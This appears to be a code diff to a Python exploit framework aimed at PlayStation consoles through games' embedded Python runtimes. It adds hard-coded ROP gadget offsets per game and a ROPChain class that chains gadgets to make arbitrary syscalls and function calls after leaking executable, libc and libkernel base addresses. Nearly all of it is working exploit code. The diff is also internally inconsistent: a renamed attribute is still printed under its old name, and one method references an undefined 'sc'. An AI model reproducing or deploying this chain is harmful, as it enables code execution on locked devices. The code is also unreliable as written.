@@ -25,14 +25,17 @@ GADGET_OFFSETS = {
             "pop rcx; ret": 0x1151A3,
             "pop rdx; ret": 0x20B6FB,
             "pop rsi; ret": 0x9884B,
+            "pop rdi; ret": 0xE2B93,
             "pop r8; ret": 0xC710D,
             "pop r9; ret": 0x68A7DF,
             "mov [rsi], rax; ret": 0x795C0A,
             "mov rsp, rbp; pop rbp; ret": 0x56AA,
             "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x3414C0,
             "add [r8 - 0x7d], rcx; ret": 0x752685,
+            "ret": 0x42,
             # libc
             "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x26FFE,
+            "mov rax, [rax]; ret": 0xB0057,
         }
     },
     "Arcade Spirits: The New Challengers": {
@@ -43,17 +46,25 @@ GADGET_OFFSETS = {
             "pop rcx; ret": 0xE6E03,
             "pop rdx; ret": 0x9C762,
             "pop rsi; ret": 0x153B1B,
+            "pop rdi; ret": 0x57456,
             "pop r8; ret": 0x25BADF,
             "pop r9; ret": 0x6654CF,
             "mov [rsi], rax; ret": 0x7D528A,
             "mov rsp, rbp; pop rbp; ret": 0xC4,
             "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x2D6410,
             "add [r8 - 0x7d], rcx; ret": 0x72087E,
+            "ret": 0x42,
             # libc
             "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x26FFE,
+            "mov rax, [rax]; ret": 0xB0057,
         }
     },
 }
+
+LIBC_GADGETS = [
+    "mov rsp, [rdi + 0x38]; pop rdi; ret",
+    "mov rax, [rax]; ret",
+]
 
 LIBC_OFFSETS = {
     "A YEAR OF SPRINGS": {
@@ -241,6 +252,21 @@ def refbytes(data):
 
 def to_hex(data):
     return str(data).encode("hex")
+
+
+def alloc(size):
+    ba = bytearray(size)
+    nogc.append(ba)
+    return ba
+
+
+def get_ref_addr(obj):
+    if isinstance(obj, bytearray):
+        return refbytearray(obj)
+    elif isinstance(obj, str):
+        return refbytes(obj)
+    else:
+        raise Exception("Unsupported object type for get_ref_addr")
 
 
 ###############
@@ -444,6 +470,114 @@ def getmem():
     return mem
 
 
+def convert_regs_to_int(*regs):
+    int_regs = []
+    for r in regs:
+        if isinstance(r, (bytearray, str)):
+            int_regs.append(get_ref_addr(r))
+        else:
+            int_regs.append(r)
+    return int_regs
+
+
+class ROPChain(object):
+    def __init__(self, sc, size=0x2000):
+        self.sc = sc
+        self.chain = bytearray(size)
+        self.return_value_buf = alloc(8)
+        self.return_value_addr = get_ref_addr(self.return_value_buf)
+        self.errno_buf = alloc(4)
+        self.errno_addr = get_ref_addr(self.errno_buf)
+        self.index = 0
+
+    @property
+    def length(self):
+        return len(self.chain) * 8
+
+    @property
+    def return_value(self):
+        return struct.unpack("<Q", self.return_value_buf[0:8])[0]
+
+    @property
+    def errno(self):
+        return struct.unpack("<I", self.errno_buf[0:4])[0]
+
+    @property
+    def addr(self):
+        return get_ref_addr(self.chain)
+
+    def append(self, value):
+        self.chain[self.index : self.index + 8] = struct.pack("<Q", value)
+        self.index += 8
+
+    def push_gadget(self, gadget_name):
+        if gadget_name not in self.sc.gadgets:
+            raise Exception("Gadget %s not found" % gadget_name)
+
+        self.append(
+            (
+                self.sc.exec_addr
+                if gadget_name not in LIBC_GADGETS
+                else self.sc.libc_addr
+            )
+            + self.sc.gadgets[gadget_name]
+        )
+
+    def push_value(self, value):
+        self.append(value)
+
+    def push_syscall(self, syscall_number, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
+        (rdi, rsi, rdx, rcx, r8, r9) = convert_regs_to_int(rdi, rsi, rdx, rcx, r8, r9)
+
+        self.push_gadget("pop rax; ret")
+        self.push_value(syscall_number)
+        self.push_gadget("pop rdi; ret")
+        self.push_value(rdi)
+        self.push_gadget("pop rsi; ret")
+        self.push_value(rsi)
+        self.push_gadget("pop rdx; ret")
+        self.push_value(rdx)
+        self.push_gadget("pop rcx; ret")
+        self.push_value(rcx)
+        self.push_gadget("pop r8; ret")
+        self.push_value(r8)
+        self.push_gadget("pop r9; ret")
+        self.push_value(r9)
+        if self.sc.platform == "ps5":
+            self.push_value(self.sc.syscall_addr)
+        else:
+            self.push_value(self.sc.syscall_table[syscall_number])
+
+    def push_call(self, addr, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
+        (rdi, rsi, rdx, rcx, r8, r9) = convert_regs_to_int(rdi, rsi, rdx, rcx, r8, r9)
+
+        self.push_gadget("pop rdi; ret")
+        self.push_value(rdi)
+        self.push_gadget("pop rsi; ret")
+        self.push_value(rsi)
+        self.push_gadget("pop rdx; ret")
+        self.push_value(rdx)
+        self.push_gadget("pop rcx; ret")
+        self.push_value(rcx)
+        self.push_gadget("pop r8; ret")
+        self.push_value(r8)
+        self.push_gadget("pop r9; ret")
+        self.push_value(r9)
+        self.push_value(addr)
+
+    def push_get_return_value(self):
+        self.push_gadget("pop rsi; ret")
+        self.push_value(self.return_value_addr)
+        self.push_gadget("mov [rsi], rax; ret")
+
+    def push_get_errno(self):
+        self.push_gadget("pop rsi; ret")
+        self.push_value(self.errno_addr)
+        self.push_call(sc.libc_addr + SELECTED_LIBC["__error"])
+        self.push_gadget("mov rax, [rax]; ret")
+        self.push_gadget("mov [rsi], rax; ret")
+
+
 class SploitCore(object):
     def __init__(self):
         self.mem = getmem()
@@ -459,8 +593,8 @@ class SploitCore(object):
         )
         print("[*] FunctionType.tp_repr address: 0x%x" % func_repr_addr)
 
-        self.exec_base_addr = func_repr_addr - SELECTED_EXEC["func_repr"]
-        print("[*] Executable base address: 0x%x" % self.exec_base_addr)
+        self.exec_addr = func_repr_addr - SELECTED_EXEC["func_repr"]
+        print("[*] Executable base address: 0x%x" % self.exec_addr)
         self.modules = {}
 
         # Use hardcoded gadgets
@@ -513,7 +647,7 @@ class SploitCore(object):
         SEGMENTS_OFFSET = 0x160
 
         self.libc_addr = (
-            readuint(self.exec_base_addr + SELECTED_EXEC["strcmp"], 8)
+            readuint(self.exec_addr + SELECTED_EXEC["strcmp"], 8)
             - SELECTED_LIBC["strcmp"]
         )
         print("[*] libc base address: 0x%x" % self.libc_addr)
@@ -543,7 +677,7 @@ class SploitCore(object):
         if ret != 0:
             raise Exception("sceKernelGetModuleInfoFromAddr failed: 0x%x" % ret)
 
-        self.libkernel_base = struct.unpack(
+        self.libkernel_addr = struct.unpack(
             "<Q", mod_info[SEGMENTS_OFFSET : SEGMENTS_OFFSET + 8]
         )[0]
         print("[*] libkernel base address: 0x%x" % self.libkernel_base)
@@ -551,11 +685,11 @@ class SploitCore(object):
         init_proc_addr = struct.unpack(
             "<Q", mod_info[INIT_PROC_ADDR_OFFSET : INIT_PROC_ADDR_OFFSET + 8]
         )[0]
-        delta = self.libkernel_base - init_proc_addr
+        delta = self.libkernel_addr - init_proc_addr
 
         if delta == 0:
             self.platform = "ps4"
-            libkernel_buf = readbuf(self.libkernel_base, 0x40000)
+            libkernel_buf = readbuf(self.libkernel_addr, 0x40000)
             pattern = (
                 0x48,
                 0xC7,
@@ -580,7 +714,7 @@ class SploitCore(object):
                     syscall_number = struct.unpack(
                         "<I", libkernel_buf[idx + 3 : idx + 7]
                     )[0]
-                    syscall_gadget_addr = self.libkernel_base + idx
+                    syscall_gadget_addr = self.libkernel_addr + idx
                     self.syscall_table[syscall_number] = syscall_gadget_addr
             if not self.syscall_table:
                 raise Exception("syscall gadget pattern not found")
@@ -626,7 +760,11 @@ class SploitCore(object):
         if len(args) > 51:
             raise Exception("Too many arguments")
 
+        (rdi, rsi, rdx, rcx, r8, r9) = convert_regs_to_int(rdi, rsi, rdx, rcx, r8, r9)
+
         for i, arg in enumerate(args):
+            if isinstance(arg, (bytearray, str)):
+                arg = get_ref_addr(arg)
             args_stack[i] = arg
 
         stack_data = bytes(
@@ -637,29 +775,29 @@ class SploitCore(object):
                     ],
                     flat(
                         [
-                            self.exec_base_addr + self.gadgets["add rsp, 0x1b8; ret"],
+                            self.exec_addr + self.gadgets["add rsp, 0x1b8; ret"],
                         ],
                         [0] * 55,
                     )
                     * 16,  # for stack alignment and stability
                     (
                         [
-                            self.exec_base_addr + self.gadgets["pop rax; ret"],
+                            self.exec_addr + self.gadgets["pop rax; ret"],
                             func_addr,  # use func_addr as syscall number
                         ]
                         if syscall
                         else []
                     )
                     + [
-                        self.exec_base_addr + self.gadgets["pop rsi; ret"],
+                        self.exec_addr + self.gadgets["pop rsi; ret"],
                         rsi if rsi is not None else 0,
-                        self.exec_base_addr + self.gadgets["pop rdx; ret"],
+                        self.exec_addr + self.gadgets["pop rdx; ret"],
                         rdx if rdx is not None else 0,
-                        self.exec_base_addr + self.gadgets["pop rcx; ret"],
+                        self.exec_addr + self.gadgets["pop rcx; ret"],
                         rcx if rcx is not None else 0,
-                        self.exec_base_addr + self.gadgets["pop r8; ret"],
+                        self.exec_addr + self.gadgets["pop r8; ret"],
                         r8 if r8 is not None else 0,
-                        self.exec_base_addr + self.gadgets["pop r9; ret"],
+                        self.exec_addr + self.gadgets["pop r9; ret"],
                         r9 if r9 is not None else 0,
                     ],
                     [
@@ -672,25 +810,24 @@ class SploitCore(object):
                                 else self.syscall_table.get(func_addr, 0)
                             )
                         ),
-                        self.exec_base_addr + self.gadgets["add rsp, 0x1b8; ret"],
+                        self.exec_addr + self.gadgets["add rsp, 0x1b8; ret"],
                     ],
                     [0] * 4,
                     args_stack,
                     [
-                        self.exec_base_addr + self.gadgets["pop rsi; ret"],
+                        self.exec_addr + self.gadgets["pop rsi; ret"],
                         refbytes(return_value),
-                        self.exec_base_addr + self.gadgets["mov [rsi], rax; ret"],
+                        self.exec_addr + self.gadgets["mov [rsi], rax; ret"],
                     ],
                     [
-                        self.exec_base_addr + self.gadgets["pop r8; ret"],
+                        self.exec_addr + self.gadgets["pop r8; ret"],
                         addrof(None) + 0x7D,
-                        self.exec_base_addr + self.gadgets["pop rcx; ret"],
+                        self.exec_addr + self.gadgets["pop rcx; ret"],
                         1,
-                        self.exec_base_addr + self.gadgets["add [r8 - 0x7d], rcx; ret"],
-                        self.exec_base_addr + self.gadgets["pop rax; ret"],
+                        self.exec_addr + self.gadgets["add [r8 - 0x7d], rcx; ret"],
+                        self.exec_addr + self.gadgets["pop rax; ret"],
                         addrof(None),
-                        self.exec_base_addr
-                        + self.gadgets["mov rsp, rbp; pop rbp; ret"],
+                        self.exec_addr + self.gadgets["mov rsp, rbp; pop rbp; ret"],
                     ],
                 )
             )
@@ -707,7 +844,7 @@ class SploitCore(object):
 
         # Set rip
         self.call_functype[16 * 8 : 16 * 8 + 8] = p64a(
-            self.exec_base_addr
+            self.exec_addr
             + self.gadgets["push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]"]
         )
         self.call_contextbuf[8:16] = p64a(self.call_functype_ptr)
